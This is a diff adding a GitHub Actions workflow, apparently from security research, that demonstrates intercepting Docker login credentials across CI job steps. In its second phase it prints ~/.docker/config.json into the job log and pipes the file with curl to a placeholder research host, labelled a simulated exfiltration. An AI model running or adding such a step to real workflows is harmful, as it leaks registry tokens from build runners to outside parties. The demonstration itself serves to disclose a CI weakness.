@@ -1,0 +1,29 @@
+name: "#8 compose — Docker credential interception"
+on: workflow_dispatch
+
+jobs:
+  test-compose:
+    name: "compose — Docker cred interception"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Phase 1: Docker login (creates ~/.docker/config.json)"
+        run: |
+          echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+          echo "=== Docker config after login ==="
+          ls -la ~/.docker/config.json
+
+      - name: "Phase 2: Simulate credential interception (this is what the payload does)"
+        run: |
+          echo "=== Reading ~/.docker/config.json (cross-step interception) ==="
+          if [ -f ~/.docker/config.json ]; then
+            echo "SUCCESS: config.json exists and is readable from a different step"
+            echo "=== Contents (would be exfiltrated in real attack) ==="
+            cat ~/.docker/config.json
+            echo ""
+            echo "=== Exfil attempt (will fail on example.com) ==="
+            cat ~/.docker/config.json | curl -sS -X POST -d @- https://eaction-research.example.com/docker-creds 2>&1 || true
+          else
+            echo "FAIL: config.json not found"
+          fi
